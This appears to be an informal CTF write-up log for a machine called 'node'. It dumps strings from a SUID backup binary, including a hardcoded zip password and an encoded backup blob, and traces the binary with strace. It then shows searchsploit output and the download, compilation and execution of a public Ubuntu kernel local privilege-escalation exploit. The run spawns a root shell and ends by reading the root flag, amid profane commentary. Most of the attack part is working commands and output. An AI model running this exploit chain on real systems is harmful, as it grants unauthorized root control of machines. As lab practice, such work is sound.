+       _-'.-.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-`__`. .-.-.-.`-_
+    _-'.-.-.-.-. .-----.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-----. .-.-.-.-.`-_
+ _-'.-.-.-.-.-. .---.-. .-----------------------------. .-.---. .---.-.-.-.`-_
+:-----------------------------------------------------------------------------:
+`---._.-----------------------------------------------------------------._.---'
+Could not open file
+Validated access token
+Ah-ah-ah! You didn't say the magic word!
+Finished! Encoded backup is below:
+UEsDBDMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAcm9vdC50eHQBmQcAAgBBRQEIAEbBKBl0rFrayqfbwJ2YyHunnYq1Za6G7XLo8C3RH/hu0fArpSvYauq4AUycRmLuWvPyJk3sF+HmNMciNHfFNLD3LdkGmgwSW8j50xlO6SWiH5qU1Edz340bxpSlvaKvE4hnK/oan4wWPabhw/2rwaaJSXucU+pLgZorY67Q/Y6cfA2hLWJabgeobKjMy0njgC9c8cQDaVrfE/ZiS1S+rPgz/e2Pc3lgkQ+lAVBqjo4zmpQltgIXauCdhvlA1Pe/BXhPQBJab7NVF6Xm3207EfD3utbrcuUuQyF+rQhDCKsAEhqQ+Yyp1Tq2o6BvWJlhtWdts7rCubeoZPDBD6Mejp3XYkbSYYbzmgr1poNqnzT5XPiXnPwVqH1fG8OSO56xAvxx2mU2EP+Yhgo4OAghyW1sgV8FxenV8p5c+u9bTBTz/7WlQDI0HUsFAOHnWBTYR4HTvyi8OPZXKmwsPAG1hrlcrNDqPrpsmxxmVR8xSRbBDLSrH14pXYKPY/a4AZKO/GtVMULlrpbpIFqZ98zwmROFstmPl/cITNYWBlLtJ5AmsyCxBybfLxHdJKHMsK6Rp4MO+wXrd/EZNxM8lnW6XNOVgnFHMBsxJkqsYIWlO0MMyU9L1CL2RRwm2QvbdD8PLWA/jp1fuYUdWxvQWt7NjmXo7crC1dA0BDPg5pVNxTrOc6lADp7xvGK/kP4F0eR+53a4dSL0b6xFnbL7WwRpcF+Ate/Ut22WlFrg9A8gqBC8Ub1SnBU2b93ElbG9SFzno5TFmzXk3onbLaaEVZl9AKPA3sGEXZvVP+jueADQsokjJQwnzg1BRGFmqWbR6hxPagTVXBbQ+hytQdd26PCuhmRUyNjEIBFx/XqkSOfAhLI9+Oe4FH3hYqb1W6xfZcLhpBs4Vwh7t2WGrEnUm2/F+X/OD+s9xeYniyUrBTEaOWKEv2NOUZudU6X2VOTX6QbHJryLdSU9XLHB+nEGeq+sdtifdUGeFLct+Ee2pgR/AsSexKmzW09cx865KuxKnR3yoC6roUBb30Ijm5vQuzg/RM71P5ldpCK70RemYniiNeluBfHwQLOxkDn/8MN0CEBr1eFzkCNdblNBVA7b9m7GjoEhQXOpOpSGrXwbiHHm5C7Zn4kZtEy729ZOo71OVuT9i+4vCiWQLHrdxYkqiC7lmfCjMh9e05WEy1EBmPaFkYgxK2c6xWErsEv38++8xdqAcdEGXJBR2RT1TlxG/YlB4B7SwUem4xG6zJYi452F1klhkxloV6paNLWrcLwokdPJeCIrUbn+C9TesqoaaXASnictzNXUKzT905OFOcJwt7FbxyXk0z3FxD/tgtUHcFBLAQI/AzMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAAAAAAAAAIIC0gQAAAAByb290LnR4dAGZBwACAEFFAQgAUEsFBgAAAAABAAEAQQAAAB4EAAAAAA==
+/root
+/etc
+/tmp/.backup_%i
+/usr/bin/zip -r -P magicword %s %s > /dev/null
+/usr/bin/base64 -w0 %s
+The target path doesn't exist
+;*2$"
+GCC: (Ubuntu 5.4.0-6ubuntu1~16.04.4) 5.4.0 20160609
+crtstuff.c
+__JCR_LIST__
+deregister_tm_clones
+__do_global_dtors_aux
+completed.7200
+__do_global_dtors_aux_fini_array_entry
+frame_dummy
+__frame_dummy_init_array_entry
+backup.c
+__FRAME_END__
+__JCR_END__
+__init_array_end
+_DYNAMIC
+__init_array_start
+__GNU_EH_FRAME_HDR
+_GLOBAL_OFFSET_TABLE_
+__libc_csu_fini
+strstr@@GLIBC_2.0
+strcmp@@GLIBC_2.0
+_ITM_deregisterTMCloneTable
+__x86.get_pc_thunk.bx
+strcspn@@GLIBC_2.0
+fgets@@GLIBC_2.0
+_edata
+fclose@@GLIBC_2.1
+time@@GLIBC_2.0
+geteuid@@GLIBC_2.0
+strcat@@GLIBC_2.0
+strcpy@@GLIBC_2.0
+getpid@@GLIBC_2.0
+__data_start
+puts@@GLIBC_2.0
+system@@GLIBC_2.0
+clock@@GLIBC_2.0
+__gmon_start__
+exit@@GLIBC_2.0
+__dso_handle
+displaySuccess
+_IO_stdin_used
+srand@@GLIBC_2.0
+strchr@@GLIBC_2.0
+__libc_start_main@@GLIBC_2.0
+displayWarning
+displayTarget
+__libc_csu_init
+fopen@@GLIBC_2.1
+strncpy@@GLIBC_2.0
+_fp_hw
+access@@GLIBC_2.0
+__bss_start
+main
+setuid@@GLIBC_2.0
+_Jv_RegisterClasses
+sprintf@@GLIBC_2.0
+remove@@GLIBC_2.0
+__TMC_END__
+_ITM_registerTMCloneTable
+.symtab
+.strtab
+.shstrtab
+.interp
+.note.ABI-tag
+.note.gnu.build-id
+.gnu.hash
+.dynsym
+.dynstr
+.gnu.version
+.gnu.version_r
+.rel.dyn
+.rel.plt
+.init
+.plt.got
+.text
+.fini
+.rodata
+.eh_frame_hdr
+.eh_frame
+.init_array
+.fini_array
+.jcr
+.dynamic
+.got.plt
+.data
+.bss
+.comment
+tom@node:/$ 
+
+
+Strace this binary, It's installed --
+
+tom@node:/tmp$ strace /usr/local/bin/backup
+strace /usr/local/bin/backup
+execve("/usr/local/bin/backup", ["/usr/local/bin/backup"], [/* 7 vars */]) = 0
+strace: [ Process PID=8226 runs in 32 bit mode. ]
+brk(NULL)                               = 0x8533000
+fcntl64(0, F_GETFD)                     = 0
+fcntl64(1, F_GETFD)                     = 0
+fcntl64(2, F_GETFD)                     = 0
+access("/etc/suid-debug", F_OK)         = -1 ENOENT (No such file or directory)
+access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
+mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xf779e000
+access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
+open("/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 4
+fstat64(4, {st_mode=S_IFREG|0644, st_size=31341, ...}) = 0
+mmap2(NULL, 31341, PROT_READ, MAP_PRIVATE, 4, 0) = 0xf7771000
+close(4)                                = 0
+access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
+open("/lib32/libc.so.6", O_RDONLY|O_CLOEXEC) = 4
+read(4, "\177ELF\1\1\1\3\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\300\207\1\0004\0\0\0"..., 512) = 512
+fstat64(4, {st_mode=S_IFREG|0755, st_size=1775464, ...}) = 0
+mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xf7770000
+mmap2(NULL, 1784348, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 4, 0) = 0xf75bc000
+mprotect(0xf7769000, 4096, PROT_NONE)   = 0
+mmap2(0xf776a000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 4, 0x1ad000) = 0xf776a000
+mmap2(0xf776d000, 10780, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xf776d000
+close(4)                                = 0
+mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xf75bb000
+set_thread_area({entry_number:-1, base_addr:0xf75bb700, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0 (entry_number:12)
+mprotect(0xf776a000, 8192, PROT_READ)   = 0
+mprotect(0x804b000, 4096, PROT_READ)    = 0
+mprotect(0xf779f000, 4096, PROT_READ)   = 0
+munmap(0xf7771000, 31341)               = 0
+geteuid32()                             = 1000
+setuid32(1000)                          = 0
+exit_group(1)                           = ?
++++ exited with 1 +++
+tom@node:/tmp$ 
+
+TURNS OUT --
+I tried this exploit fucking hours ago and it failed !! --
+I'm pretty sure it has to do with the TTY / TERM ENV --
+
+
+└────╼ searchsploit Ubuntu 16.04.4
+------------------------------------------------------------------------------------------------------------------------------------------------------ ----------------------------------------
+ Exploit Title                                                                                                                                        |  Path
+                                                                                                                                                      | (/usr/share/exploitdb/)
+------------------------------------------------------------------------------------------------------------------------------------------------------ ----------------------------------------
+Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation                                                                                | exploits/linux/local/44298.c
+------------------------------------------------------------------------------------------------------------------------------------------------------ ----------------------------------------
+Shellcodes: No Result
+Papers: No Result
+┌─╼[/usr/src/linux-source-4.17] 
+└────╼ 
+
+Sploit Search --
+https://www.exploit-db.com/exploits/44298/
+
+Depends on --
+mark@node:/tmp$ cat /proc/sys/kernel/unprivileged_bpf_disabled 
+0
+mark@node:/tmp$ 
+
+
+mark@node:/tmp$ curl -O https://www.exploit-db.com/download/44298.c --insecure
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  6021  100  6021    0     0  10427      0 --:--:-- --:--:-- --:--:-- 10435
+mark@node:/tmp$ less 44298.c 
+mark@node:/tmp$ gcc 44298.c -o 44298
+mark@node:/tmp$ ./44298 
+task_struct = ffff880039fc7000
+uidptr = ffff88003cf5ce44
+spawning root shell
+root@node:/tmp# id
+uid=0(root) gid=0(root) groups=0(root),1001(mark)
+root@node:/tmp# cd /root/
+root@node:/root# ls
+root.txt
+root@node:/root# cat root.txt 
+1722e99ca5f353b362556a62bd5e6be0
+root@node:/root# 
+
+FUCKER.
+
